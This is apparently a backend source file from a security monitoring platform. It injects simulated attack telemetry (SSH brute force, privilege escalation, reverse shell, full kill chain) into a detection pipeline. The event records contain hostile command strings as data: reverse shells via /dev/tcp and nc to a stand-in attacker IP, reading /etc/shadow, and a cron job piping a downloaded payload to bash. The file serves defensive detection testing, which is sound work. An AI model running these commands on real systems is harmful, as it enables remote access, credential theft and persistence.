import asyncio
from datetime import datetime, timedelta
from typing import Optional
from pydantic import BaseModel
from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session

from backend.app.database.connection import get_db
from backend.app.models.agent import Agent
from backend.app.schemas.event import EventCreate
from backend.app.api.events import _process_single_event
from backend.app.websocket_manager import ws_manager

router = APIRouter()

class SimulationRunRequest(BaseModel):
    scenario: str = "ssh_brute_force"  # ssh_brute_force, privilege_escalation, reverse_shell_c2, full_kill_chain
    hostname: Optional[str] = "ubuntu-prod-01"
    agent_id: Optional[str] = "linux-agent-01"
    attacker_ip: Optional[str] = "198.51.100.42"

@router.post("/run")
async def run_attack_simulation(payload: SimulationRunRequest, db: Session = Depends(get_db)):
    """
    Executes an educational attack scenario where realistic telemetry events
    flow through the entire live ingestion, detection, and correlation pipeline.
    """
    # Ensure a simulated agent exists
    agent = db.query(Agent).filter(Agent.agent_id == payload.agent_id).first()
    if not agent:
        agent = Agent(
            agent_id=payload.agent_id,
            hostname=payload.hostname,
            operating_system="Ubuntu 22.04.3 LTS",
            ip_address="10.0.1.50",
            agent_version="1.0.0",
            status="ONLINE",
            auth_token_hash="simulated-token-hash",
            last_seen=datetime.utcnow(),
            registered_at=datetime.utcnow()
        )
        db.add(agent)
        db.commit()

    base_time = datetime.utcnow() - timedelta(minutes=15)
    generated_events = []

    if payload.scenario == "ssh_brute_force":
        # 5 failed SSH logins followed by 1 successful login
        for i in range(5):
            t = base_time + timedelta(seconds=i * 20)
            user = "root" if i % 2 == 0 else "admin"
            ev = EventCreate(
                agent_id=payload.agent_id,
                hostname=payload.hostname,
                timestamp=t,
                event_type="authentication",
                action="ssh_login",
                status="failed",
                username=user,
                source_ip=payload.attacker_ip,
                source_port=49152 + i,
                destination_port=22,
                raw_message=f"sshd[{12400+i}]: Failed password for {user} from {payload.attacker_ip} port {49152+i} ssh2",
                simulation=True
            )
            generated_events.append(ev)

        # Breakthrough success
        t_succ = base_time + timedelta(seconds=120)
        ev_succ = EventCreate(
            agent_id=payload.agent_id,
            hostname=payload.hostname,
            timestamp=t_succ,
            event_type="authentication",
            action="ssh_login",
            status="success",
            username="admin",
            source_ip=payload.attacker_ip,
            source_port=49200,
            destination_port=22,
            raw_message=f"sshd[12410]: Accepted password for admin from {payload.attacker_ip} port 49200 ssh2",
            simulation=True
        )
        generated_events.append(ev_succ)

    elif payload.scenario == "privilege_escalation":
        # Sudo abuse and /etc/shadow access
        t1 = base_time + timedelta(seconds=10)
        generated_events.append(EventCreate(
            agent_id=payload.agent_id,
            hostname=payload.hostname,
            timestamp=t1,
            event_type="privilege",
            action="sudo_exec",
            status="failed",
            username="deployer",
            source_ip=payload.attacker_ip,
            command="sudo -i",
            raw_message="sudo: deployer : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/deployer ; USER=root ; COMMAND=/bin/bash",
            simulation=True
        ))
        t2 = base_time + timedelta(seconds=30)
        generated_events.append(EventCreate(
            agent_id=payload.agent_id,
            hostname=payload.hostname,
            timestamp=t2,
            event_type="process",
            action="execve",
            status="success",
            username="root",
            source_ip=payload.attacker_ip,
            process="/bin/cat",
            command="cat /etc/shadow",
            raw_message="auditd: type=SYSCALL comm=\"cat\" exe=\"/bin/cat\" args=\"cat /etc/shadow\" uid=0 success=yes",
            simulation=True
        ))

    elif payload.scenario == "reverse_shell_c2":
        t1 = base_time + timedelta(seconds=15)
        generated_events.append(EventCreate(
            agent_id=payload.agent_id,
            hostname=payload.hostname,
            timestamp=t1,
            event_type="process",
            action="execve",
            status="success",
            username="www-data",
            source_ip=payload.attacker_ip,
            process="/bin/bash",
            command="bash -i >& /dev/tcp/198.51.100.42/4444 0>&1",
            raw_message="auditd: type=EXECVE arch=c000003e a0=\"/bin/bash\" a1=\"-i\" a2=\">&\" a3=\"/dev/tcp/198.51.100.42/4444\"",
            simulation=True
        ))
        t2 = base_time + timedelta(seconds=20)
        generated_events.append(EventCreate(
            agent_id=payload.agent_id,
            hostname=payload.hostname,
            timestamp=t2,
            event_type="network",
            action="outbound_socket",
            status="success",
            username="www-data",
            source_ip=payload.attacker_ip,
            destination_ip="198.51.100.42",
            destination_port=4444,
            raw_message="iptables: OUTPUT SYN connect to 198.51.100.42:4444 by UID=33",
            simulation=True
        ))

    elif payload.scenario == "full_kill_chain":
        # 1. Recon: nmap scan
        for p in [22, 80, 443, 3306, 8080, 9000]:
            generated_events.append(EventCreate(
                agent_id=payload.agent_id,
                hostname=payload.hostname,
                timestamp=base_time + timedelta(seconds=len(generated_events)*2),
                event_type="network",
                action="socket_connect",
                status="success",
                source_ip=payload.attacker_ip,
                destination_port=p,
                raw_message=f"kernel: [UFW BLOCK] IN=eth0 SRC={payload.attacker_ip} DST=10.0.1.50 DPT={p}",
                simulation=True
            ))

        # 2. Automated tool execution
        generated_events.append(EventCreate(
            agent_id=payload.agent_id,
            hostname=payload.hostname,
            timestamp=base_time + timedelta(seconds=40),
            event_type="process",
            action="execve",
            status="success",
            username="admin",
            source_ip=payload.attacker_ip,
            process="/bin/bash",
            command="./linpeas.sh -a",
            raw_message="auditd: type=EXECVE a0=\"/bin/bash\" a1=\"./linpeas.sh\" a2=\"-a\" uid=1000",
            simulation=True
        ))

        # 3. SSH Brute force (4 attempts + 1 success)
        for i in range(4):
            generated_events.append(EventCreate(
                agent_id=payload.agent_id,
                hostname=payload.hostname,
                timestamp=base_time + timedelta(seconds=50 + i*5),
                event_type="authentication",
                action="ssh_login",
                status="failed",
                username="root",
                source_ip=payload.attacker_ip,
                destination_port=22,
                raw_message=f"sshd: Failed password for root from {payload.attacker_ip} port {51000+i}",
                simulation=True
            ))

        generated_events.append(EventCreate(
            agent_id=payload.agent_id,
            hostname=payload.hostname,
            timestamp=base_time + timedelta(seconds=80),
            event_type="authentication",
            action="ssh_login",
            status="success",
            username="root",
            source_ip=payload.attacker_ip,
            destination_port=22,
            raw_message=f"sshd: Accepted password for root from {payload.attacker_ip} port 51010",
            simulation=True
        ))

        # 4. Reverse Shell
        generated_events.append(EventCreate(
            agent_id=payload.agent_id,
            hostname=payload.hostname,
            timestamp=base_time + timedelta(seconds=90),
            event_type="process",
            action="execve",
            status="success",
            username="root",
            source_ip=payload.attacker_ip,
            process="nc",
            command="nc -e /bin/bash 198.51.100.42 4444",
            raw_message="auditd: type=EXECVE a0=\"nc\" a1=\"-e\" a2=\"/bin/bash\" a3=\"198.51.100.42\" a4=\"4444\"",
            simulation=True
        ))

        # 5. Persistence via Crontab
        generated_events.append(EventCreate(
            agent_id=payload.agent_id,
            hostname=payload.hostname,
            timestamp=base_time + timedelta(seconds=110),
            event_type="process",
            action="execve",
            status="success",
            username="root",
            source_ip=payload.attacker_ip,
            command="crontab -e ; echo '* * * * * curl http://198.51.100.42/payload.sh | bash' >> /etc/cron.d/persist",
            raw_message="crontab: (root) REPLACE (root) in /etc/cron.d/persist",
            simulation=True
        ))

    # Process all simulation events sequentially through the live pipeline
    ingested_events = []
    for ev in generated_events:
        saved_ev = await _process_single_event(ev, db)
        ingested_events.append(saved_ev.id)

    await ws_manager.broadcast("SIMULATION_COMPLETED", {
        "scenario": payload.scenario,
        "events_count": len(ingested_events),
        "hostname": payload.hostname,
        "attacker_ip": payload.attacker_ip
    })

    return {
        "status": "simulation_completed",
        "scenario": payload.scenario,
        "events_ingested": len(ingested_events),
        "hostname": payload.hostname,
        "attacker_ip": payload.attacker_ip,
        "message": f"Successfully injected {len(ingested_events)} events across detection and correlation engines."
    }
